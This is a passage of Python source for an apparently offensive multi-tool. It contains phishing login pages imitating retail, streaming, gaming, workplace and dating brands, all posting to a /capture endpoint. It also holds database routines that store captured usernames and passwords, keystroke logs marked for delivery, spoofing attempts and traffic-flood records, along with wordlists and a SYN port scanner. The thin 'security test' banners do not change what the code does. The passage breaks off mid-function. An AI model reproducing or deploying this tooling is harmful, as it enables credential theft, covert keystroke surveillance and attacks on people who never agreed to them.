<button type="submit">Login</button></form>
<div class="warning">⚠️ Security awareness test</div></div></div>
</body>
</html>'''
    
    def _create_ecommerce_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Sign In</title>
<style>
    body {{ font-family: 'Amazon Ember', Arial, sans-serif; background: #EAEDED; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 350px; width: 100%; padding: 20px; }}
    .login-box {{ background: white; border-radius: 8px; padding: 20px 26px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }}
    .logo h1 {{ color: {color}; font-size: 28px; text-align: center; }}
    input {{ width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #a6a6a6; border-radius: 4px; box-sizing: border-box; }}
    button {{ width: 100%; padding: 10px; background: {color}; color: white; border: none; border-radius: 8px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #fce4d6; border-radius: 4px; text-align: center; font-size: 12px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test</div></div></div>
</body>
</html>'''
    
    def _create_streaming_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Sign In</title>
<style>
    body {{ font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; background: #141414; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 350px; width: 100%; padding: 20px; }}
    .login-box {{ background: rgba(0,0,0,0.75); border-radius: 8px; padding: 60px 68px 40px; color: white; }}
    .logo h1 {{ color: {color}; font-size: 32px; text-align: center; margin-bottom: 28px; }}
    input {{ width: 100%; padding: 16px; background: #333; border: none; border-radius: 4px; color: white; margin: 8px 0; box-sizing: border-box; }}
    button {{ width: 100%; padding: 16px; background: {color}; color: white; border: none; border-radius: 4px; margin-top: 24px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #ffd700; border-radius: 4px; color: #000; text-align: center; font-size: 12px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security test page</div></div></div>
</body>
</html>'''
    
    def _create_gaming_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Login</title>
<style>
    body {{ font-family: 'Motiva Sans', 'Arial', sans-serif; background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 400px; width: 100%; padding: 20px; }}
    .login-box {{ background: #2c2f33; border-radius: 8px; padding: 32px; }}
    .logo h1 {{ color: {color}; text-align: center; margin-bottom: 30px; }}
    input {{ width: 100%; padding: 12px; background: #23272a; border: 1px solid #40444b; border-radius: 4px; color: white; margin: 8px 0; box-sizing: border-box; }}
    button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 4px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #ffd700; border-radius: 4px; text-align: center; font-size: 12px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Login</button></form>
<div class="warning">⚠️ Security test</div></div></div>
</body>
</html>'''
    
    def _create_work_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Sign In</title>
<style>
    body {{ font-family: 'Slack-Lato', 'appleLogo', 'Helvetica Neue', Arial, sans-serif; background: #f4f4f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 400px; width: 100%; padding: 20px; }}
    .login-box {{ background: white; border-radius: 12px; padding: 40px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }}
    .logo h1 {{ color: {color}; text-align: center; margin-bottom: 30px; }}
    input {{ width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 4px; box-sizing: border-box; }}
    button {{ width: 100%; padding: 12px; background: {color}; color: white; border: none; border-radius: 4px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 4px; text-align: center; font-size: 12px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="email" name="email" placeholder="Email" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Sign In</button></form>
<div class="warning">⚠️ Security awareness test</div></div></div>
</body>
</html>'''
    
    def _create_dating_template(self, name: str, color: str, platform: str) -> str:
        return f'''<!DOCTYPE html>
<html><head><title>{name} - Login</title>
<style>
    body {{ font-family: 'Helvetica Neue', Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }}
    .container {{ max-width: 350px; width: 100%; padding: 20px; }}
    .login-box {{ background: white; border-radius: 24px; padding: 32px; text-align: center; }}
    .logo h1 {{ color: {color}; font-size: 28px; margin-bottom: 20px; }}
    input {{ width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #ddd; border-radius: 30px; box-sizing: border-box; }}
    button {{ width: 100%; padding: 14px; background: {color}; color: white; border: none; border-radius: 30px; cursor: pointer; }}
    .warning {{ margin-top: 20px; padding: 10px; background: #fff3cd; border-radius: 8px; font-size: 11px; }}
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1>{name}</h1></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Email or Phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">Log In</button></form>
<div class="warning">⚠️ Security test page</div></div></div>
</body>
</html>'''
    
    def _create_custom_template(self) -> str:
        return '''<!DOCTYPE html>
<html><head><title>REAL SEAL - Secure Portal</title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Segoe UI', Arial, sans-serif; background: linear-gradient(135deg, #0a1128 0%, #1a1a2e 100%); display: flex; justify-content: center; align-items: center; min-height: 100vh; }
    .container { max-width: 420px; width: 100%; padding: 20px; }
    .login-box { background: rgba(255,255,255,0.08); backdrop-filter: blur(12px); border-radius: 24px; padding: 40px; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 20px 40px rgba(0,0,0,0.4); }
    .logo { text-align: center; margin-bottom: 30px; }
    .logo h1 { background: linear-gradient(135deg, #fff, #7bc9ff); -webkit-background-clip: text; background-clip: text; color: transparent; font-size: 36px; }
    .logo p { color: #7bc9ff; font-size: 14px; margin-top: 8px; }
    input { width: 100%; padding: 14px 16px; margin: 12px 0; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); border-radius: 12px; color: white; font-size: 16px; transition: 0.3s; box-sizing: border-box; }
    input:focus { border-color: #2aa9ff; outline: none; background: rgba(255,255,255,0.15); }
    button { width: 100%; padding: 14px; background: linear-gradient(135deg, #2aa9ff, #0066cc); color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
    button:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(42,169,255,0.3); }
    .warning { margin-top: 24px; padding: 12px; background: rgba(255,193,7,0.2); border: 1px solid #ffc107; border-radius: 12px; color: #ffd966; text-align: center; font-size: 12px; }
    i { margin-right: 8px; }
</style>
</head>
<body>
<div class="container"><div class="login-box"><div class="logo"><h1><i class="fas fa-shield-halos"></i> REAL SEAL</h1><p>Secure Command Portal</p></div>
<form method="POST" action="/capture"><input type="text" name="username" placeholder="Username" required><input type="password" name="password" placeholder="Password" required><button type="submit"><i class="fas fa-arrow-right"></i> Authenticate</button></form>
<div class="warning"><i class="fas fa-exclamation-triangle"></i> Security awareness test - Do not enter real credentials</div></div></div>
</body>
</html>'''
    
    def _init_wordlists(self):
        """Initialize wordlists for password cracking and scanning"""
        wordlists = {
            "common_passwords.txt": ["password", "123456", "qwerty", "admin", "letmein", "welcome", "monkey", "dragon", "master", "baseball"],
            "subdomains.txt": ["www", "mail", "ftp", "localhost", "webmail", "smtp", "pop", "ns1", "webdisk", "ns2", "cpanel", "whm", "autodiscover", "autoconfig"],
            "directories.txt": ["admin", "login", "wp-admin", "administrator", "dashboard", "panel", "cpanel", "webmail", "phpmyadmin", "mysql"],
            "user_agents.txt": ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"]
        }
        
        for filename, content in wordlists.items():
            filepath = os.path.join(WORDLISTS_DIR, filename)
            if not os.path.exists(filepath):
                with open(filepath, 'w') as f:
                    f.write('\n'.join(content))
    
    # ==================== Database CRUD Operations ====================
    
    def log_command(self, command: str, source: str = "local", platform: str = "local",
                   user_id: str = None, success: bool = True, output: str = "", execution_time: float = 0.0):
        try:
            self.cursor.execute('''
                INSERT INTO command_history (command, source, platform, user_id, success, output, execution_time)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (command[:500], source, platform, user_id, success, output[:5000], execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log command: {e}")
    
    def log_scan_result(self, target: str, scan_type: str, open_ports: List[Dict],
                       closed_ports: List[int] = None, scan_time: float = 0.0, success: bool = True):
        try:
            open_ports_json = json.dumps(open_ports)
            closed_ports_json = json.dumps(closed_ports or [])
            
            self.cursor.execute('''
                INSERT INTO scan_results (target, scan_type, open_ports, closed_ports, scan_time, success)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (target, scan_type, open_ports_json, closed_ports_json, scan_time, success))
            self.conn.commit()
            
            # Also log individual ports to history
            for port_info in open_ports:
                self.cursor.execute('''
                    INSERT OR IGNORE INTO port_history (target, port, protocol, state, service)
                    VALUES (?, ?, ?, ?, ?)
                ''', (target, port_info.get('port'), port_info.get('protocol', 'tcp'),
                      'open', port_info.get('service', 'unknown')))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log scan: {e}")
    
    def log_threat(self, threat_type: str, source_ip: str = None, target_ip: str = None,
                  severity: str = "medium", description: str = "", platform: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO threats (threat_type, source_ip, target_ip, severity, description, platform)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (threat_type, source_ip, target_ip, severity, description[:500], platform))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log threat: {e}")
    
    def add_ssh_connection(self, conn_id: str, name: str, host: str, port: int,
                          username: str, password: str = None, key_path: str = None, notes: str = "") -> bool:
        try:
            password_encrypted = self.encryption.encrypt(password) if password else None
            self.cursor.execute('''
                INSERT OR REPLACE INTO ssh_connections (id, name, host, port, username, password_encrypted, key_path, notes)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?)
            ''', (conn_id, name, host, port, username, password_encrypted, key_path, notes))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add SSH connection: {e}")
            return False
    
    def get_ssh_connections(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_connections ORDER BY name')
            connections = []
            for row in self.cursor.fetchall():
                conn = dict(row)
                if conn.get('password_encrypted'):
                    conn['password'] = self.encryption.decrypt(conn['password_encrypted'])
                connections.append(conn)
            return connections
        except Exception as e:
            logger.error(f"Failed to get SSH connections: {e}")
            return []
    
    def get_ssh_connection(self, conn_id: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM ssh_connections WHERE id = ?', (conn_id,))
            row = self.cursor.fetchone()
            if row:
                conn = dict(row)
                if conn.get('password_encrypted'):
                    conn['password'] = self.encryption.decrypt(conn['password_encrypted'])
                return conn
            return None
        except Exception as e:
            logger.error(f"Failed to get SSH connection: {e}")
            return None
    
    def update_ssh_status(self, conn_id: str, status: str):
        try:
            self.cursor.execute('''
                UPDATE ssh_connections SET status = ?, last_connected = CURRENT_TIMESTAMP
                WHERE id = ?
            ''', (status, conn_id))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update SSH status: {e}")
    
    def log_ssh_command(self, conn_id: str, command: str, output: str, success: bool, execution_time: float):
        try:
            self.cursor.execute('''
                INSERT INTO ssh_command_history (connection_id, command, output, success, execution_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (conn_id, command[:500], output[:5000], success, execution_time))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log SSH command: {e}")
    
    def log_traffic(self, traffic_type: str, target_ip: str, target_port: int, duration: int,
                   packets_sent: int, bytes_sent: int, packet_rate: int, status: str, error: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO traffic_logs (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, packet_rate, status, error)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            ''', (traffic_type, target_ip, target_port, duration, packets_sent, bytes_sent, packet_rate, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log traffic: {e}")
    
    def save_phishing_link(self, link_id: str, platform: str, phishing_url: str, template_name: str) -> bool:
        try:
            self.cursor.execute('''
                INSERT INTO phishing_links (id, platform, phishing_url, template_name)
                VALUES (?, ?, ?, ?)
            ''', (link_id, platform, phishing_url, template_name))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to save phishing link: {e}")
            return False
    
    def get_phishing_links(self, active_only: bool = True) -> List[Dict]:
        try:
            if active_only:
                self.cursor.execute('SELECT * FROM phishing_links WHERE active = 1 ORDER BY created_at DESC')
            else:
                self.cursor.execute('SELECT * FROM phishing_links ORDER BY created_at DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get phishing links: {e}")
            return []
    
    def update_phishing_clicks(self, link_id: str):
        try:
            self.cursor.execute('UPDATE phishing_links SET clicks = clicks + 1 WHERE id = ?', (link_id,))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update clicks: {e}")
    
    def save_captured_credential(self, link_id: str, username: str, password: str,
                                 ip_address: str, user_agent: str, additional_data: str = ""):
        try:
            self.cursor.execute('''
                INSERT INTO captured_credentials (phishing_link_id, username, password, ip_address, user_agent, additional_data)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (link_id, username[:200], password[:200], ip_address, user_agent[:500], additional_data[:1000]))
            self.conn.commit()
            logger.info(f"Credentials captured for {link_id} from {ip_address}")
        except Exception as e:
            logger.error(f"Failed to save credentials: {e}")
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        try:
            if link_id:
                self.cursor.execute('''
                    SELECT * FROM captured_credentials WHERE phishing_link_id = ? ORDER BY timestamp DESC
                ''', (link_id,))
            else:
                self.cursor.execute('SELECT * FROM captured_credentials ORDER BY timestamp DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get credentials: {e}")
            return []
    
    def get_phishing_templates(self, platform: str = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('SELECT * FROM phishing_templates WHERE platform = ? ORDER BY name', (platform,))
            else:
                self.cursor.execute('SELECT * FROM phishing_templates ORDER BY platform, name')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get templates: {e}")
            return []
    
    def get_phishing_template_html(self, name: str) -> Optional[str]:
        try:
            self.cursor.execute('SELECT html_content FROM phishing_templates WHERE name = ?', (name,))
            row = self.cursor.fetchone()
            return row['html_content'] if row else None
        except Exception as e:
            logger.error(f"Failed to get template HTML: {e}")
            return None
    
    def add_managed_ip(self, ip: str, added_by: str = "system", notes: str = "") -> bool:
        try:
            ipaddress.ip_address(ip)
            self.cursor.execute('''
                INSERT OR IGNORE INTO managed_ips (ip_address, added_by, notes, first_seen)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ''', (ip, added_by, notes))
            self.cursor.execute('''
                UPDATE managed_ips SET last_seen = CURRENT_TIMESTAMP WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to add managed IP: {e}")
            return False
    
    def block_ip(self, ip: str, reason: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 1, block_reason = ?, blocked_date = CURRENT_TIMESTAMP
                WHERE ip_address = ?
            ''', (reason[:200], ip))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to block IP: {e}")
            return False
    
    def unblock_ip(self, ip: str, executed_by: str = "system") -> bool:
        try:
            self.cursor.execute('''
                UPDATE managed_ips 
                SET is_blocked = 0, block_reason = NULL, blocked_date = NULL
                WHERE ip_address = ?
            ''', (ip,))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to unblock IP: {e}")
            return False
    
    def get_managed_ips(self, include_blocked: bool = True) -> List[Dict]:
        try:
            if include_blocked:
                self.cursor.execute('SELECT * FROM managed_ips ORDER BY threat_score DESC, added_date DESC')
            else:
                self.cursor.execute('SELECT * FROM managed_ips WHERE is_blocked = 0 ORDER BY threat_score DESC')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get managed IPs: {e}")
            return []
    
    def get_ip_info(self, ip: str) -> Optional[Dict]:
        try:
            self.cursor.execute('SELECT * FROM managed_ips WHERE ip_address = ?', (ip,))
            row = self.cursor.fetchone()
            return dict(row) if row else None
        except Exception as e:
            logger.error(f"Failed to get IP info: {e}")
            return None
    
    def get_recent_threats(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM threats WHERE resolved = 0 ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get threats: {e}")
            return []
    
    def get_command_history(self, limit: int = 20, platform: str = None) -> List[Dict]:
        try:
            if platform:
                self.cursor.execute('''
                    SELECT * FROM command_history WHERE platform = ? ORDER BY timestamp DESC LIMIT ?
                ''', (platform, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM command_history ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get command history: {e}")
            return []
    
    def get_scan_history(self, target: str = None, limit: int = 10) -> List[Dict]:
        try:
            if target:
                self.cursor.execute('''
                    SELECT * FROM scan_results WHERE target = ? ORDER BY timestamp DESC LIMIT ?
                ''', (target, limit))
            else:
                self.cursor.execute('''
                    SELECT * FROM scan_results ORDER BY timestamp DESC LIMIT ?
                ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get scan history: {e}")
            return []
    
    def get_port_scan_results(self, target: str) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM port_history WHERE target = ? ORDER BY port
            ''', (target,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get port results: {e}")
            return []
    
    def get_traffic_logs(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_logs ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic logs: {e}")
            return []
    
    def get_nikto_scans(self, limit: int = 10) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM nikto_scans ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get Nikto scans: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        stats = {}
        try:
            queries = [
                ('total_commands', 'SELECT COUNT(*) FROM command_history'),
                ('total_threats', 'SELECT COUNT(*) FROM threats'),
                ('active_threats', 'SELECT COUNT(*) FROM threats WHERE resolved = 0'),
                ('total_ssh_connections', 'SELECT COUNT(*) FROM ssh_connections'),
                ('total_managed_ips', 'SELECT COUNT(*) FROM managed_ips'),
                ('blocked_ips', 'SELECT COUNT(*) FROM managed_ips WHERE is_blocked = 1'),
                ('total_traffic_logs', 'SELECT COUNT(*) FROM traffic_logs'),
                ('total_phishing_links', 'SELECT COUNT(*) FROM phishing_links'),
                ('total_captured_credentials', 'SELECT COUNT(*) FROM captured_credentials'),
                ('total_nikto_scans', 'SELECT COUNT(*) FROM nikto_scans'),
                ('total_keylogs', 'SELECT COUNT(*) FROM keylogs'),
                ('total_scans', 'SELECT COUNT(*) FROM scan_results'),
                ('total_spoofing', 'SELECT COUNT(*) FROM spoofing_attempts'),
                ('open_ports_count', 'SELECT COUNT(*) FROM port_history WHERE state = "open"')
            ]
            
            for key, query in queries:
                self.cursor.execute(query)
                stats[key] = self.cursor.fetchone()[0] or 0
            
            # Get recent activity
            self.cursor.execute('''
                SELECT timestamp FROM command_history ORDER BY timestamp DESC LIMIT 1
            ''')
            row = self.cursor.fetchone()
            stats['last_activity'] = row['timestamp'] if row else None
            
        except Exception as e:
            logger.error(f"Failed to get statistics: {e}")
        
        return stats
    
    def log_spoofing(self, spoof_type: str, original: str, spoofed: str, target: str, interface: str, success: bool, output: str):
        try:
            self.cursor.execute('''
                INSERT INTO spoofing_attempts (spoof_type, original_value, spoofed_value, target, interface, success, output)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (spoof_type, original, spoofed, target, interface, success, output[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log spoofing: {e}")
    
    def log_keylog(self, keystroke: str, window_title: str = None, process_name: str = None):
        try:
            self.cursor.execute('''
                INSERT INTO keylogs (keystroke, window_title, process_name)
                VALUES (?, ?, ?)
            ''', (keystroke, window_title, process_name))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log keylog: {e}")
    
    def get_keylogs(self, limit: int = 100, delivered_only: bool = False) -> List[Dict]:
        try:
            if delivered_only:
                self.cursor.execute('SELECT * FROM keylogs WHERE delivered = 1 ORDER BY timestamp DESC LIMIT ?', (limit,))
            else:
                self.cursor.execute('SELECT * FROM keylogs ORDER BY timestamp DESC LIMIT ?', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get keylogs: {e}")
            return []
    
    def mark_keylogs_delivered(self, ids: List[int]):
        try:
            placeholders = ','.join('?' for _ in ids)
            self.cursor.execute(f'UPDATE keylogs SET delivered = 1 WHERE id IN ({placeholders})', ids)
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to mark keylogs delivered: {e}")
    
    def authorize_user(self, platform: str, user_id: str, username: str = None) -> bool:
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO authorized_users (platform, user_id, username, authorized)
                VALUES (?, ?, ?, 1)
            ''', (platform, user_id, username))
            self.conn.commit()
            return True
        except Exception as e:
            logger.error(f"Failed to authorize user: {e}")
            return False
    
    def is_user_authorized(self, platform: str, user_id: str) -> bool:
        try:
            self.cursor.execute('''
                SELECT authorized FROM authorized_users 
                WHERE platform = ? AND user_id = ? AND authorized = 1
            ''', (platform, user_id))
            return self.cursor.fetchone() is not None
        except Exception as e:
            logger.error(f"Failed to check authorization: {e}")
            return False
    
    def log_time_command(self, command: str, user_id: str = None, result: str = ""):
        try:
            self.cursor.execute('''
                INSERT INTO time_commands (command, user_id, result)
                VALUES (?, ?, ?)
            ''', (command, user_id, result[:500]))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to log time command: {e}")
    
    def get_time_history(self, limit: int = 20) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM time_commands ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get time history: {e}")
            return []
    
    def update_platform_status(self, platform: str, enabled: bool, status: str, error: str = None):
        try:
            self.cursor.execute('''
                INSERT OR REPLACE INTO platform_status (platform, enabled, last_connected, status, error)
                VALUES (?, ?, CURRENT_TIMESTAMP, ?, ?)
            ''', (platform, enabled, status, error))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to update platform status: {e}")
    
    def get_platform_status(self) -> List[Dict]:
        try:
            self.cursor.execute('SELECT * FROM platform_status')
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get platform status: {e}")
            return []
    
    def add_traffic_stat(self, bytes_sent: int, bytes_recv: int, packets_sent: int,
                        packets_recv: int, connections: int, tcp_conn: int, udp_conn: int):
        try:
            self.cursor.execute('''
                INSERT INTO traffic_stats (bytes_sent, bytes_recv, packets_sent, packets_recv, connections, tcp_connections, udp_connections)
                VALUES (?, ?, ?, ?, ?, ?, ?)
            ''', (bytes_sent, bytes_recv, packets_sent, packets_recv, connections, tcp_conn, udp_conn))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add traffic stat: {e}")
    
    def get_traffic_stats(self, limit: int = 60) -> List[Dict]:
        try:
            self.cursor.execute('''
                SELECT * FROM traffic_stats ORDER BY timestamp DESC LIMIT ?
            ''', (limit,))
            return [dict(row) for row in self.cursor.fetchall()]
        except Exception as e:
            logger.error(f"Failed to get traffic stats: {e}")
            return []
    
    def add_system_metrics(self, cpu: float, memory: float, disk: float, net_sent: int, net_recv: int, uptime: int):
        try:
            self.cursor.execute('''
                INSERT INTO system_metrics (cpu_percent, memory_percent, disk_percent, network_sent, network_recv, uptime_seconds)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (cpu, memory, disk, net_sent, net_recv, uptime))
            self.conn.commit()
        except Exception as e:
            logger.error(f"Failed to add system metrics: {e}")
    
    def close(self):
        try:
            if self.conn:
                self.conn.close()
        except Exception as e:
            logger.error(f"Error closing database: {e}")

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    """Advanced network utilities with scanning and analysis"""
    
    @staticmethod
    def execute_command(cmd: List[str], timeout: int = 60, shell: bool = False) -> Dict[str, Any]:
        start_time = time.time()
        try:
            if shell:
                result = subprocess.run(' '.join(cmd), shell=True, capture_output=True,
                                       text=True, timeout=timeout, encoding='utf-8', errors='ignore')
            else:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout,
                                       encoding='utf-8', errors='ignore')
            
            return {
                'success': result.returncode == 0,
                'output': result.stdout.strip() if result.stdout else result.stderr.strip(),
                'error': result.stderr if result.returncode != 0 else None,
                'exit_code': result.returncode,
                'execution_time': time.time() - start_time
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'output': f'Timeout after {timeout}s', 'exit_code': -1, 'execution_time': timeout}
        except Exception as e:
            return {'success': False, 'output': str(e), 'exit_code': -1, 'execution_time': time.time() - start_time}
    
    @staticmethod
    def ping(target: str, count: int = 4, timeout: int = 2) -> Dict[str, Any]:
        """Enhanced ping with statistics"""
        if platform.system().lower() == 'windows':
            result = NetworkTools.execute_command(['ping', '-n', str(count), '-w', str(timeout * 1000), target])
        else:
            result = NetworkTools.execute_command(['ping', '-c', str(count), '-W', str(timeout), target])
        
        # Parse ping statistics
        output = result.get('output', '')
        parsed = {'sent': count, 'received': 0, 'lost': count, 'min': None, 'avg': None, 'max': None}
        
        # Extract stats from output
        if 'received' in output.lower():
            import re
            match = re.search(r'(\d+) received', output.lower())
            if match:
                parsed['received'] = int(match.group(1))
                parsed['lost'] = count - parsed['received']
            
            # Extract timing
            time_matches = re.findall(r'time[<=]\s*(\d+(?:\.\d+)?)\s*ms', output.lower())
            if time_matches:
                times = [float(t) for t in time_matches]
                parsed['min'] = min(times)
                parsed['max'] = max(times)
                parsed['avg'] = sum(times) / len(times)
        
        result['parsed'] = parsed
        return result
    
    @staticmethod
    def advanced_scan(target: str, ports: str = "1-1000", scan_type: str = "tcp", timeout: float = 1.0) -> Dict[str, Any]:
        """Advanced port scanner with TCP SYN, TCP Connect, UDP, and service detection"""
        start_time = time.time()
        open_ports = []
        closed_ports = []
        filtered_ports = []
        service_info = {}
        
        # Parse port range
        port_list = []
        if '-' in ports:
            start_p, end_p = map(int, ports.split('-'))
            port_list = list(range(start_p, min(end_p + 1, 65535)))
        elif ',' in ports:
            port_list = [int(p.strip()) for p in ports.split(',')]
        else:
            port_list = [int(ports)]
        
        total_ports = len(port_list)
        scanned = 0
        
        def scan_port(port):
            nonlocal scanned
            try:
                if scan_type == "tcp_connect":
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(timeout)
                    result = sock.connect_ex((target, port))
                    sock.close()
                    
                    if result == 0:
                        # Try to get service banner
                        service = NetworkTools._get_service_banner(target, port, timeout)
                        return {'port': port, 'protocol': 'tcp', 'state': 'open', 'service': service}
                    else:
                        return {'port': port, 'state': 'closed'}
                        
                elif scan_type == "tcp_syn" and SCAPY_AVAILABLE:
                    from scapy.all import IP, TCP, sr1
                    try:
                        packet = IP(dst=target)/TCP(dport=port, flags='S')
                        response = sr1(packet, timeout=timeout, verbose=False)
                        
                        if response and response.haslayer(TCP):
                            if response.getlayer(TCP).flags == 0x12:  # SYN-ACK
                                return {'port': port, 'protocol': 'tcp', 'state': 'open', 'service': 'unknown'}
                            elif response.getlayer(TCP).flags == 0x14:  # RST
                                return {'port': port, 'state': 'closed'}
                        return {'port': port, 'state': 'filtered'}
                    except:
                        return {'port': port, 'state': 'error'}
                        
                elif scan_type == "udp" and SCAPY_AVAILABLE:
                    from scapy.all import IP, UDP, sr1
                    try:
                        packet = IP(dst=target)/UDP(dport=port)
